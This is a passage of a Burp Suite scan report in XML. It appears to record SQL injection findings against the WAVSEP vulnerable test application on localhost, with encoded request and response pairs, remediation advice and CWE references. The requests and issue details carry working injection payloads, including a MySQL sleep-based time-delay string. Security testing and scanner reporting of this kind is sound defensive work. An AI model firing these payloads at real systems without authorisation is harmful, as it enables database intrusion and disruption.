yaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVRpbWVEZWxheS1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1UaW1lRGVsYXktVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCcn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogQ2F1c2UgYSBkZWxheSBpbiBkYXRhYmFzZSByZXNwb25zZSB0aW1lczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVRpbWVEZWxheS1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1UaW1lRGVsYXktVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDIgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogQ2F1c2UgYSBkZWxheSBpbiBkYXRhYmFzZSByZXNwb25zZSB0aW1lczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7497616619032643584</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case03-InjsectionInSearch-RetrieveMultipleValuesInSingleColumn-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case03-InjsectionInSearch-RetrieveMultipleValuesInSingleColumn-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAzLUluanNlY3Rpb25JblNlYXJjaC1SZXRyaWV2ZU11bHRpcGxlVmFsdWVzSW5TaW5nbGVDb2x1bW4tVW5pb25FeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULVVuaW9uRXhwbG9pdC9DYXNlMDMtSW5qc2VjdGlvbkluU2VhcmNoLVJldHJpZXZlTXVsdGlwbGVWYWx1ZXNJblNpbmdsZUNvbHVtbi1VbmlvbkV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMTo0NyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAzLUluanNlY3Rpb25JblNlYXJjaC1SZXRyaWV2ZU11bHRpcGxlVmFsdWVzSW5TaW5nbGVDb2x1bW4tVW5pb25FeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULVVuaW9uRXhwbG9pdC9DYXNlMDMtSW5qc2VjdGlvbkluU2VhcmNoLVJldHJpZXZlTXVsdGlwbGVWYWx1ZXNJblNpbmdsZUNvbHVtbi1VbmlvbkV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0Jyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAxOjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgbXVsdGlwbGUgdmFsdWVzIGluIHNpbmdsZSBjb2x1bW4gZnJvbSB0YWJsZSAndXNlcnMnPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAzLUluanNlY3Rpb25JblNlYXJjaC1SZXRyaWV2ZU11bHRpcGxlVmFsdWVzSW5TaW5nbGVDb2x1bW4tVW5pb25FeHBsb2l0LmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTMNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NULVVuaW9uRXhwbG9pdC9DYXNlMDMtSW5qc2VjdGlvbkluU2VhcmNoLVJldHJpZXZlTXVsdGlwbGVWYWx1ZXNJblNpbmdsZUNvbHVtbi1VbmlvbkV4cGxvaXQuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2c9dGVzdGlucHV0JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAyOjA4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDMgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogUmV0cmlldmUgbXVsdGlwbGUgdmFsdWVzIGluIHNpbmdsZSBjb2x1bW4gZnJvbSB0YWJsZSAndXNlcnMnPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6304256726424915968</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case04-InjectionInSearch-ListingDatabaseContents-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case04-InjectionInSearch-ListingDatabaseContents-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
